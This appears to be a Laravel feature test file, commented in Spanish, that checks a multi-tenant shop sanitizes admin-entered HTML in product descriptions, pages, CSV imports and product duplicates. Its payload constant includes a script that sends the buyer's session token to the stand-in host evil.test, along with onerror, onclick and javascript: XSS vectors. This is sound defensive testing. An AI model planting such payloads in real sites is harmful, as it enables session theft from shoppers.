<?php

namespace Tests\Feature;

use App\Models\Page;
use App\Models\Product;
use App\Models\Tenant;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Tests\TestCase;

/**
 * Fija la sanitizacion del HTML guardado por el admin (SEC-3).
 *
 * Todas las tiendas comparten origen y el token del comprador vive en
 * localStorage, asi que un <script> guardado en la descripcion de un producto
 * permitiria robar sesiones de compradores de otras tiendas.
 *
 * Estos casos deben fallar si se quita el cast App\Casts\SanitizedHtml de
 * Product::description o de Page::content.
 */
class HtmlSanitizationTest extends TestCase
{
    use RefreshDatabase;

    private Tenant $tenant;
    private User $admin;

    /** Payloads que no deben sobrevivir a la escritura. */
    private const PAYLOAD = '<script>fetch("//evil.test?c="+localStorage.token)</script>'
        . '<img src=x onerror="alert(1)">'
        . '<p onclick="robar()">Texto legitimo</p>'
        . '<a href="javascript:alert(1)">click</a>';

    protected function setUp(): void
    {
        parent::setUp();

        $this->tenant = Tenant::create([
            'slug'            => 'tienda-xss',
            'name'            => 'Tienda XSS',
            'whatsapp_number' => '51999999999',
            'is_active'       => true,
        ]);

        $this->admin = new User([
            'name'      => 'Admin',
            'email'     => 'admin@tienda-xss.com',
            'password'  => 'password123',
            'role'      => 'admin',
            'is_active' => true,
        ]);
        $this->admin->tenant_id = $this->tenant->id;
        $this->admin->save();
    }

    private function adminHeaders(): array
    {
        $token = $this->admin->createToken('spa-token', ['admin'])->plainTextToken;

        return [
            'Authorization' => "Bearer $token",
            'X-Tenant'      => $this->tenant->slug,
        ];
    }

    /** Comprueba que no queda ningun vector ejecutable en el HTML guardado. */
    private function assertHtmlIsSafe(?string $html): void
    {
        $this->assertNotNull($html);
        $this->assertStringNotContainsString('<script', $html);
        $this->assertStringNotContainsString('onerror', $html);
        $this->assertStringNotContainsString('onclick', $html);
        $this->assertStringNotContainsString('javascript:', $html);
        $this->assertStringNotContainsString('<img', $html);
    }

    public function test_descripcion_de_producto_se_sanitiza_al_crear(): void
    {
        $response = $this->withHeaders($this->adminHeaders())->postJson('/api/products', [
            'name'        => 'GPU con payload',
            'price'       => 1200,
            'stock'       => 5,
            'description' => self::PAYLOAD,
        ]);

        $response->assertStatus(201);

        $product = Product::withoutGlobalScopes()->where('name', 'GPU con payload')->firstOrFail();

        $this->assertHtmlIsSafe($product->description);
        // El texto legitimo sobrevive, solo se cae el vector.
        $this->assertStringContainsString('Texto legitimo', $product->description);
    }

    public function test_descripcion_de_producto_se_sanitiza_al_actualizar(): void
    {
        $product = new Product([
            'name'   => 'Producto limpio',
            'price'  => 100,
            'stock'  => 1,
            'status' => 'published',
        ]);
        $product->tenant_id = $this->tenant->id;
        $product->save();

        $response = $this->withHeaders($this->adminHeaders())
            ->putJson("/api/products/{$product->id}", [
                'name'        => 'Producto limpio',
                'price'       => 100,
                'stock'       => 1,
                'description' => self::PAYLOAD,
            ]);

        $response->assertStatus(200);

        $this->assertHtmlIsSafe($product->fresh()->description);
    }

    public function test_el_formato_legitimo_del_editor_se_conserva(): void
    {
        // Exactamente las etiquetas que generan las toolbars del panel.
        $html = '<strong>RTX 4070</strong> con <em>12GB</em><h3>Specs</h3><ul><li>DDR6</li></ul>';

        $product = new Product([
            'name'        => 'Producto con formato',
            'price'       => 100,
            'stock'       => 1,
            'description' => $html,
        ]);
        $product->tenant_id = $this->tenant->id;
        $product->save();

        $this->assertSame($html, $product->fresh()->description);
    }

    public function test_el_texto_plano_no_se_altera(): void
    {
        $product = new Product([
            'name'        => 'Producto plano',
            'price'       => 100,
            'stock'       => 1,
            'description' => 'Tarjeta de video de 12GB, garantia 1 anio.',
        ]);
        $product->tenant_id = $this->tenant->id;
        $product->save();

        $this->assertSame(
            'Tarjeta de video de 12GB, garantia 1 anio.',
            $product->fresh()->description
        );
    }

    public function test_contenido_de_pagina_se_sanitiza(): void
    {
        $response = $this->withHeaders($this->adminHeaders())->postJson('/api/pages', [
            'title'     => 'Envios',
            'slug'      => 'envios',
            'content'   => self::PAYLOAD,
            'is_active' => true,
        ]);

        $this->assertContains($response->status(), [200, 201]);

        $page = Page::withoutGlobalScopes()->where('slug', 'envios')->firstOrFail();

        $this->assertHtmlIsSafe($page->content);
        $this->assertStringContainsString('Texto legitimo', $page->content);
    }

    /**
     * El import CSV escribe description sin pasar por StoreProductRequest.
     * Este caso es el que justifica sanitizar en el cast del modelo y no en el
     * FormRequest: si la limpieza estuviera en la validacion, esta via la saltaria.
     */
    public function test_import_csv_sanitiza_la_descripcion(): void
    {
        $csv = "nombre,precio,stock,descripcion\n"
            . 'Producto importado,500,3,"<script>alert(1)</script><b>Bueno</b>"' . "\n";

        $response = $this->withHeaders($this->adminHeaders())->post('/api/products/import', [
            'file' => UploadedFile::fake()->createWithContent('productos.csv', $csv),
        ]);

        $response->assertStatus(200);

        $product = Product::withoutGlobalScopes()->where('name', 'Producto importado')->firstOrFail();

        $this->assertHtmlIsSafe($product->description);
        $this->assertStringContainsString('<b>Bueno</b>', $product->description);
    }

    /**
     * El duplicado copia la descripcion de otro producto; si el original quedo
     * sucio (guardado antes de este fix), la copia debe salir limpia.
     */
    public function test_duplicar_producto_sanitiza_la_descripcion_heredada(): void
    {
        $original = new Product([
            'name'   => 'Original',
            'price'  => 100,
            'stock'  => 1,
            'status' => 'published',
        ]);
        $original->tenant_id = $this->tenant->id;
        $original->save();

        // Simula contenido sucio ya presente en la base (escrito antes del cast).
        \DB::table('products')->where('id', $original->id)->update([
            'description' => '<script>alert(1)</script>Descripcion',
        ]);

        $response = $this->withHeaders($this->adminHeaders())
            ->postJson("/api/products/{$original->id}/duplicate");

        $this->assertContains($response->status(), [200, 201]);

        $copia = Product::withoutGlobalScopes()
            ->where('id', '!=', $original->id)
            ->where('tenant_id', $this->tenant->id)
            ->firstOrFail();

        $this->assertHtmlIsSafe($copia->description);
    }
}
